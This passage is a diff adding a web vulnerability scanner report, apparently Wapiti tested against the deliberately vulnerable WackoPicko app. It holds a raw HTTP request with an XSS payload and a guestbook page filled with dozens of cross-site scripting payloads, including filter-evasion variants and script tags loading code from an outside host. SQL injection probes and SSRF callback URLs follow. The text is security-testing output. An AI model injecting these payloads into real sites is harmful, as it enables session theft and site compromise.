+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://web/guestbook.php
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                                    content-length: 75
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    name=default&amp;comment=%3CScRiPt%3Ealert%28%27wr3t6z3yuc%27%29%3C%2FsCrIpT%3E
+                                    <br>
+                            </pre>
+                        </section>
+                            <section id="tab-vuln-17-1-3" style="min-height: 124px;" class="is-hidden">
+                                <pre style="white-space: nowrap">
+                                    HTTP 200<br />
+                                            date: Wed, 20 Mar 2024 14:22:53 GMT<br />
+                                            server: Apache/2.4.57 (Debian)<br />
+                                            x-powered-by: PHP/8.2.10<br />
+                                            expires: Thu, 19 Nov 1981 08:52:00 GMT<br />
+                                            cache-control: no-store, no-cache, must-revalidate<br />
+                                            pragma: no-cache<br />
+                                            vary: Accept-Encoding<br />
+                                            content-length: 3185<br />
+                                            keep-alive: timeout=5, max=32<br />
+                                            connection: Keep-Alive<br />
+                                            content-type: text/html; charset=UTF-8<br />
+                                    <br />
+                                    
+
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/screen.css&#34; type=&#34;text/css&#34; media=&#34;screen, projection&#34;&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/print.css&#34; type=&#34;text/css&#34; media=&#34;print&#34;&gt;
+    &lt;!--[if IE]&gt;&lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/ie.css&#34; type=&#34;text/css&#34; media=&#34;screen, projection&#34;&gt;&lt;![endif]--&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/stylings.css&#34; type=&#34;text/css&#34; media=&#34;screen&#34;&gt;
+    &lt;title&gt;WackoPicko.com&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;div class=&#34;container &#34; style=&#34;border: 2px solid #5c95cf;&#34;&gt;
+      &lt;div class=&#34;column span-24 first last&#34;&gt;
+	&lt;h1 id=&#34;title&#34;&gt;&lt;a href=&#34;/&#34;&gt;WackoPicko.com&lt;/a&gt;&lt;/h1&gt;
+      &lt;/div&gt;
+      &lt;div id=&#34;menu&#34;&gt;
+	&lt;div class=&#34;column prepend-1 span-14 first&#34;&gt;
+	  &lt;ul class=&#34;menu&#34;&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/users/home.php&#34;&gt;&lt;span&gt;Home&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/pictures/upload.php&#34;&gt;&lt;span&gt;Upload&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/pictures/recent.php&#34;&gt;&lt;span&gt;Recent&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li class=&#34;current&#34;&gt;&lt;a href=&#34;/guestbook.php&#34;&gt;&lt;span&gt;Guestbook&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+
+      	  &lt;/ul&gt;
+	&lt;/div&gt;
+	&lt;div class=&#34;column prepend-1 span-7 first last&#34;&gt;
+	  &lt;ul class=&#34;menu top_login&#34; &gt;
+      	    &lt;li&gt;&lt;a href=&#34;/users/login.php&#34;&gt;&lt;Span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+      	  &lt;/ul&gt;
+	&lt;/div&gt;
+      &lt;/div&gt;
+
+
+
+      &lt;div class=&#34;column span-24 first last&#34; id=&#34;search_bar_blue&#34;&gt;
+	&lt;div class=&#34;column prepend-17 span-7 first last&#34; id=&#34;search_box&#34;&gt;
+	  &lt;form action=&#34;/pictures/search.php&#34; method=&#34;get&#34; style=&#34;display:inline;&#34;&gt;
+	    &lt;input id=&#34;query2&#34; name=&#34;query&#34; size=&#34;15&#34; style=&#34;padding: 2px; font-size: 16px; text-decoration:none;border:none;vertical-align:middle;&#34; type=&#34;text&#34; value=&#34;&#34;/&gt;
+	    &lt;input src=&#34;/images/search_button_white.gif&#34; type=&#34;image&#34; style=&#34;border: 0pt none ; position: relative; top: 0px;vertical-align:middle;margin-left: 1em;&#34; /&gt;
+	  &lt;/form&gt;
+	&lt;/div&gt;
+      &lt;/div&gt;
+   
+&lt;div class=&#34;column prepend-1 span-24 first last&#34;&gt;
+&lt;h2&gt;Guestbook&lt;/h2&gt;
+&lt;h4&gt;See what people are saying about us!&lt;/h4&gt;
+
+	&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt	&amp;gt;alert(/wrcu7k0scd/)&amp;lt;/sCrIpT	&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object	data=javAscripT:alert(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;(alert)(/wrcu7k0scd/)//&amp;lt;/scr&amp;lt;/script&amp;gt;ipt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt src=https://w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt src=https://w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/scr&amp;lt;/script&amp;gt;ipt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;img src onerror=&amp;amp;emsp;prompt`${/wrcu7k0scd/}`&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;sCrIpt&amp;gt;&amp;lt;!--
+confirm(/wrcu7k0scd/)//--&amp;gt;&amp;lt;/sCrIpt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;Script e=&amp;quot;&amp;gt;&amp;quot; src=&amp;quot;https://w0vq99.com/wrcu7k0scdz.js&amp;quot;&amp;gt;&amp;lt;/Script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;img src=k onerror=prompt`wrcu7k0scd`&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;svg onload=&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27wrcu7k0scd&amp;amp;#x27&amp;amp;#x29&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;input autofocus onfocus =top[(584390752*16).toString(32-1*2)](/wrcu7k0scd_/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;div id=&amp;quot;wrcu7k0scd&amp;quot;&amp;gt;yolo&amp;lt;/div&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;wr3t6z3yuc&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&lt;ScRiPt&gt;alert(&#39;wr3t6z3yuc&#39;)&lt;/sCrIpT&gt;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;input autofocus onfocus =top[(584390752*16).toString(32-1*2)](/wk6w0h8ore_/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;div id=&amp;quot;wk6w0h8ore&amp;quot;&amp;gt;yolo&amp;lt;/div&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by wrcu7k0scd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(&amp;#039;wrcu7k0scd&amp;#039;)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(&amp;quot;wrcu7k0scd&amp;quot;)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(/wrcu7k0scd/)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG/oNloAd=alert(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG/oNloAd=alert(/wrcu7k0scd/)// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG
+oNloAd=alert(&amp;#039;wrcu7k0scd&amp;#039;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;Script src=https://w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/Script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt src=//w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/ScRiPt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;(alert)(/wrcu7k0scd/);&amp;lt;/ScRiPt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(&amp;quot;wrcu7k0scd&amp;quot;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(&amp;#039;wrcu7k0scd&amp;#039;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;quot;javascript:alert(&amp;#039;wrcu7k0scd&amp;#039;)&amp;quot;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;quot;JaVasCript:alert(&amp;#039;wrcu7k0scd&amp;#039;)&amp;quot;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;#039;JaVasCript:alert(&amp;quot;wrcu7k0scd&amp;quot;)&amp;#039;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;iFrAme src=&amp;quot;jAvasCript:alert(/wrcu7k0scd/);&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;details open ontoggle=confirm(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;body/oNpagEshoW=(confirm)(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;a
+autofocus
+onfocus=&amp;#039;(function(){return window})()[&amp;quot;alert&amp;quot;](&amp;quot;wrcu7k0scd&amp;quot;)&amp;#039;
+href&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;frame src=&amp;quot;javascript:alert(/wrcu7k0scd/)&amp;quot;/&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;marquee loop=1 width=0 onfinish=prompt(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;gt;&amp;lt;svg&amp;gt;&amp;lt;animate onbegin=prompt(/wrcu7k0scd/) attributeName=u dur=1s&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt/src=https://w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/sCrIpT/&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt	src=https://w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG	src=z	oNeRror=alert(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by 0[FF]&amp;lt;sCripT[FF]&amp;gt;alert(/wrcu7k0scd/)&amp;lt;/sCripT[FF]&amp;gt;[FF]0 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;Script src=https://w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/Script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt src=//w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/ScRiPt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;(alert)(/wk6w0h8ore/);&amp;lt;/ScRiPt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(&amp;quot;wk6w0h8ore&amp;quot;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(&amp;#039;wk6w0h8ore&amp;#039;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;quot;javascript:alert(&amp;#039;wk6w0h8ore&amp;#039;)&amp;quot;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;quot;JaVasCript:alert(&amp;#039;wk6w0h8ore&amp;#039;)&amp;quot;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;#039;JaVasCript:alert(&amp;quot;wk6w0h8ore&amp;quot;)&amp;#039;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;iFrAme src=&amp;quot;jAvasCript:alert(/wk6w0h8ore/);&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;details open ontoggle=confirm(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;body/oNpagEshoW=(confirm)(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;a
+autofocus
+onfocus=&amp;#039;(function(){return window})()[&amp;quot;alert&amp;quot;](&amp;quot;wk6w0h8ore&amp;quot;)&amp;#039;
+href&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;frame src=&amp;quot;javascript:alert(/wk6w0h8ore/)&amp;quot;/&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;marquee loop=1 width=0 onfinish=prompt(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;gt;&amp;lt;svg&amp;gt;&amp;lt;animate onbegin=prompt(/wk6w0h8ore/) attributeName=u dur=1s&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt/src=https://w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/sCrIpT/&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt	src=https://w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG	src=z	oNeRror=alert(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by 0[FF]&amp;lt;sCripT[FF]&amp;gt;alert(/wk6w0h8ore/)&amp;lt;/sCripT[FF]&amp;gt;[FF]0 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt	&amp;gt;alert(/wk6w0h8ore/)&amp;lt;/sCrIpT	&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object	data=javAscripT:alert(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;(alert)(/wk6w0h8ore/)//&amp;lt;/scr&amp;lt;/script&amp;gt;ipt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt src=https://w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt src=https://w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/scr&amp;lt;/script&amp;gt;ipt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;img src onerror=&amp;amp;emsp;prompt`${/wk6w0h8ore/}`&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;sCrIpt&amp;gt;&amp;lt;!--
+confirm(/wk6w0h8ore/)//--&amp;gt;&amp;lt;/sCrIpt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;Script e=&amp;quot;&amp;gt;&amp;quot; src=&amp;quot;https://w0vq99.com/wk6w0h8orez.js&amp;quot;&amp;gt;&amp;lt;/Script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;img src=k onerror=prompt`wk6w0h8ore`&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;svg onload=&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27wk6w0h8ore&amp;amp;#x27&amp;amp;#x29&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;wyv86vk1mx&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&lt;ScRiPt&gt;alert(&#39;wyv86vk1mx&#39;)&lt;/sCrIpT&gt;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by wk6w0h8ore &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(&amp;#039;wk6w0h8ore&amp;#039;)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(&amp;quot;wk6w0h8ore&amp;quot;)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(/wk6w0h8ore/)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG/oNloAd=alert(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG/oNloAd=alert(/wk6w0h8ore/)// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG
+oNloAd=alert(&amp;#039;wk6w0h8ore&amp;#039;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34; AND 72=97 AND &#34;88&#34;=&#34;88&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34; AND 63=63 AND &#34;10&#34;=&#34;10&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!) AND 38=99 AND (50=50&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!) AND 37=98 AND (75=75&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!) AND 56=56 AND (77=77&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39;) AND 95=116 AND (&#39;78&#39;=&#39;78&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39;) AND 63=97 AND (&#39;89&#39;=&#39;89&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39;) AND 81=81 AND (&#39;10&#39;=&#39;10&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34;) AND 49=127 AND (&#34;38&#34;=&#34;38&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34;) AND 12=63 AND (&#34;42&#34;=&#34;42&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34;) AND 52=52 AND (&#34;27&#34;=&#34;27&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;https://wapiti3.ovh/ssrf/t9izvr/1/636f6d6d656e74/&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by https://wapiti3.ovh/ssrf/t9izvr/1/6e616d65/ &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by https://wapiti3.ovh/ssrf/t9izvr/2/6e616d65/ &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;https://wapiti3.ovh/ssrf/t9izvr/2/636f6d6d656e74/&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz AND 32=32 AND 58=58 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039; AND 43=103 AND &amp;#039;47&amp;#039;=&amp;#039;47 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039; AND 99=194 AND &amp;#039;27&amp;#039;=&amp;#039;27 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039; AND 68=68 AND &amp;#039;44&amp;#039;=&amp;#039;44 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot; AND 26=72 AND &amp;quot;82&amp;quot;=&amp;quot;82 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot; AND 67=114 AND &amp;quot;71&amp;quot;=&amp;quot;71 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot; AND 38=38 AND &amp;quot;78&amp;quot;=&amp;quot;78 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz) AND 66=115 AND (63=63 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz) AND 15=86 AND (54=54 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz) AND 19=19 AND (77=77 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039;) AND 24=36 AND (&amp;#039;10&amp;#039;=&amp;#039;10 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
